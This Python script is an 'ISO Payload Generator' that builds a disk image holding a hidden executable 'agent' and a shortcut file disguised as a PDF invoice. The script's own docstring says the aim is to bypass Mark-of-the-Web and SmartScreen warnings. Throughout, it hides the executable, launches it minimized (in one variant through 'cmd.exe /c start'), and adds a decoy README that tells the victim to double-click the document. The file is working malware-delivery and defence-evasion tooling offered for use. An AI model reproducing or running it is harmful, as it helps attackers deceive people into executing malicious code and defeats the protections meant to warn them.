#!/usr/bin/env python3
"""
ISO Payload Generator - Bypasses Mark-of-the-Web (MOTW)
Creates ISO containing agent.exe + LNK that looks like PDF

When user mounts ISO, files don't have MOTW = No SmartScreen popup!
"""

import os
import sys
import struct
import shutil
import tempfile
import subprocess
import argparse
from pathlib import Path


def create_lnk_file(lnk_path: str, target_exe: str, icon_index: int = 0, 
                    working_dir: str = ".", arguments: str = "", 
                    description: str = "Document", show_cmd: int = 7):
    """
    Create a Windows .lnk shortcut file.
    
    show_cmd: 1=Normal, 3=Maximized, 7=Minimized (hidden)
    icon_index: For shell32.dll - 1=Document, 70=PDF-like, 71=TXT
    """
    
    # LNK file structure (simplified)
    # Reference: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink
    
    # Header
    header_size = struct.pack('<I', 0x4C)  # 76 bytes
    clsid = bytes.fromhex('0114020000000000C000000000000046')  # LNK CLSID
    
    # Link flags
    # HasLinkTargetIDList | HasLinkInfo | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation
    link_flags = 0x00000001 | 0x00000002 | 0x00000008 | 0x00000010 | 0x00000020 | 0x00000040
    link_flags_bytes = struct.pack('<I', link_flags)
    
    # File attributes (FILE_ATTRIBUTE_ARCHIVE)
    file_attrs = struct.pack('<I', 0x20)
    
    # Timestamps (zeroed)
    timestamps = bytes(24)
    
    # File sizes
    file_size = struct.pack('<I', 0)
    
    # Icon index
    icon_idx = struct.pack('<i', icon_index)
    
    # Show command
    show = struct.pack('<I', show_cmd)
    
    # Hotkey (none)
    hotkey = struct.pack('<H', 0)
    
    # Reserved
    reserved = bytes(10)
    
    # Build header
    header = (header_size + clsid + link_flags_bytes + file_attrs + 
              timestamps + file_size + icon_idx + show + hotkey + reserved)
    
    # IDList (simplified - just computer + relative path)
    # This is a minimal IDList that works
    def string_data(s: str) -> bytes:
        """Create StringData structure"""
        encoded = s.encode('utf-16-le')
        return struct.pack('<H', len(s)) + encoded
    
    # LinkTargetIDList - simplified
    # We'll use a minimal approach that works for relative paths
    
    # ItemID for "My Computer"
    my_computer_clsid = bytes.fromhex('14001F50E04FD020EA3A6910A2D808002B30309D')
    
    # Terminal ID
    terminal_id = struct.pack('<H', 0)
    
    id_list_data = my_computer_clsid + terminal_id
    id_list_size = struct.pack('<H', len(id_list_data))
    id_list = id_list_size + id_list_data
    
    # LinkInfo structure (for relative path resolution)
    # We'll keep this minimal - just use relative path
    
    # Relative path (StringData)
    relative_path = string_data(target_exe)
    
    # Working directory
    work_dir = string_data(working_dir)
    
    # Arguments
    args = string_data(arguments)
    
    # Icon location (shell32.dll for system icons)
    icon_loc = string_data("C:\\Windows\\System32\\shell32.dll")
    
    # Build the LNK file
    # For simplicity, we'll use a different approach - pylnk3 style binary
    
    # Actually let's use a pre-built template approach that's more reliable
    lnk_data = create_lnk_binary(target_exe, working_dir, arguments, icon_index, show_cmd)
    
    with open(lnk_path, 'wb') as f:
        f.write(lnk_data)
    
    return True


def create_lnk_binary(target: str, workdir: str = ".", args: str = "", 
                      icon_index: int = 0, show_cmd: int = 7) -> bytes:
    """Create LNK binary using proper structure"""
    
    import io
    
    def write_string(s: str) -> bytes:
        """Write unicode string with length prefix"""
        data = s.encode('utf-16-le')
        return struct.pack('<H', len(s)) + data
    
    buf = io.BytesIO()
    
    # === SHELL_LINK_HEADER ===
    buf.write(struct.pack('<I', 0x4C))  # HeaderSize
    buf.write(bytes.fromhex('0114020000000000C000000000000046'))  # LinkCLSID
    
    # LinkFlags: HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode
    flags = 0x00000008 | 0x00000010 | 0x00000020 | 0x00000040 | 0x00000080
    buf.write(struct.pack('<I', flags))
    
    buf.write(struct.pack('<I', 0x20))  # FileAttributes (ARCHIVE)
    buf.write(bytes(8))  # CreationTime
    buf.write(bytes(8))  # AccessTime  
    buf.write(bytes(8))  # WriteTime
    buf.write(struct.pack('<I', 0))  # FileSize
    buf.write(struct.pack('<i', icon_index))  # IconIndex
    buf.write(struct.pack('<I', show_cmd))  # ShowCommand
    buf.write(struct.pack('<H', 0))  # HotKey
    buf.write(bytes(2))  # Reserved1
    buf.write(bytes(4))  # Reserved2
    buf.write(bytes(4))  # Reserved3
    
    # === STRING_DATA ===
    # Note: No IDList since we didn't set HasLinkTargetIDList
    # No LinkInfo since we didn't set HasLinkInfo
    
    # RelativePath
    buf.write(write_string(target))
    
    # WorkingDir
    buf.write(write_string(workdir))
    
    # CommandLineArguments
    buf.write(write_string(args))
    
    # IconLocation
    buf.write(write_string("C:\\Windows\\System32\\shell32.dll"))
    
    return buf.getvalue()


def create_payload_iso(agent_path: str, output_iso: str, lnk_name: str = "Invoice_2025.pdf",
                       agent_hidden_name: str = "data.exe", icon_type: str = "pdf"):
    """
    Create ISO containing hidden agent + LNK shortcut
    
    Args:
        agent_path: Path to the agent EXE
        output_iso: Output ISO file path
        lnk_name: Name for the LNK file (without .lnk extension)
        agent_hidden_name: Name for hidden agent EXE
        icon_type: Icon type (pdf, doc, xls, folder)
    """
    
    # Icon indices for shell32.dll
    icons = {
        "pdf": 1,      # Generic document
        "doc": 1,      # Document
        "xls": 1,      # Document  
        "folder": 4,   # Folder
        "txt": 70,     # Text file
    }
    icon_idx = icons.get(icon_type, 1)
    
    # Create temp directory for ISO contents
    with tempfile.TemporaryDirectory() as tmpdir:
        # Copy agent with hidden name
        agent_dest = os.path.join(tmpdir, agent_hidden_name)
        shutil.copy2(agent_path, agent_dest)
        
        # Create LNK file
        lnk_path = os.path.join(tmpdir, f"{lnk_name}.lnk")
        
        # LNK points to the hidden agent
        # Using relative path so it works when ISO is mounted
        create_lnk_file(
            lnk_path=lnk_path,
            target_exe=agent_hidden_name,
            icon_index=icon_idx,
            working_dir=".",
            arguments="",
            show_cmd=7  # SW_SHOWMINNOACTIVE (hidden)
        )
        
        # Also create a decoy readme
        readme_path = os.path.join(tmpdir, "README.txt")
        with open(readme_path, 'w') as f:
            f.write("Double-click the document to open.\n")
        
        # Create ISO using genisoimage
        cmd = [
            'genisoimage',
            '-o', output_iso,
            '-V', 'Documents',  # Volume label
            '-J',               # Joliet extensions (long filenames)
            '-r',               # Rock Ridge extensions
            '-hide', agent_hidden_name,  # Hide the EXE in some views
            tmpdir
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"Error creating ISO: {result.stderr}")
            return False
        
        print(f"[+] Created ISO: {output_iso}")
        print(f"    LNK: {lnk_name}.lnk → {agent_hidden_name}")
        print(f"    Size: {os.path.getsize(output_iso) / 1024 / 1024:.1f} MB")
        
        return True


def create_iso_with_cmd(agent_path: str, output_iso: str, lnk_name: str = "Invoice_2025.pdf"):
    """
    Alternative: Create ISO with cmd.exe based LNK (more reliable)
    The LNK runs cmd.exe which runs the hidden EXE
    """
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Copy agent with innocuous name
        hidden_name = "~data.dat"
        agent_dest = os.path.join(tmpdir, hidden_name)
        shutil.copy2(agent_path, agent_dest)
        
        # Create LNK that uses cmd to run the payload
        lnk_path = os.path.join(tmpdir, f"{lnk_name}.lnk")
        
        # This LNK will run: cmd.exe /c start "" "~data.dat"
        create_lnk_file(
            lnk_path=lnk_path,
            target_exe="cmd.exe",
            icon_index=1,  # Document icon
            working_dir=".",
            arguments=f'/c start "" "{hidden_name}"',
            show_cmd=7  # Hidden
        )
        
        # Create ISO
        cmd = [
            'genisoimage',
            '-o', output_iso,
            '-V', 'Documents',
            '-J', '-r',
            tmpdir
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"Error: {result.stderr}")
            return False
            
        print(f"[+] Created: {output_iso} ({os.path.getsize(output_iso)/1024/1024:.1f} MB)")
        return True


def main():
    parser = argparse.ArgumentParser(description='ISO Payload Generator - MOTW Bypass')
    parser.add_argument('agent', help='Path to agent EXE')
    parser.add_argument('-o', '--output', default='payload.iso', help='Output ISO path')
    parser.add_argument('-n', '--name', default='Invoice_2025.pdf', help='LNK display name')
    parser.add_argument('-t', '--type', default='pdf', choices=['pdf', 'doc', 'xls', 'txt'],
                        help='Document type for icon')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.agent):
        print(f"Error: Agent not found: {args.agent}")
        sys.exit(1)
    
    success = create_payload_iso(
        agent_path=args.agent,
        output_iso=args.output,
        lnk_name=args.name,
        icon_type=args.type
    )
    
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
